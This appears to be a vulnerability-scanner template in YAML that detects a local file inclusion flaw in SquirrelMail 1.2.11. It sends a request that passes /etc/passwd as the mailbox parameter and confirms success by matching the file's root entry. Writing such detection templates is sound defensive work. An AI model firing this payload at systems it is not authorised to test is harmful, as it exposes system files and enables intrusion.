id: "squirrelmail-lfi"
name: "SquirrelMail 1.2.11 - Local File Inclusion"
severity: "high"
description: "SquirrelMail 1.2.11 is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "lfi"
  - "squirrelmail"
  - "edb"
  - "vuln"
reference: "https://www.exploit-db.com/exploits/22793"
spaExclusion: true
request:
  method: "GET"
  path: "/src/read_body.php?mailbox=/etc/passwd&passed_id=1&"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
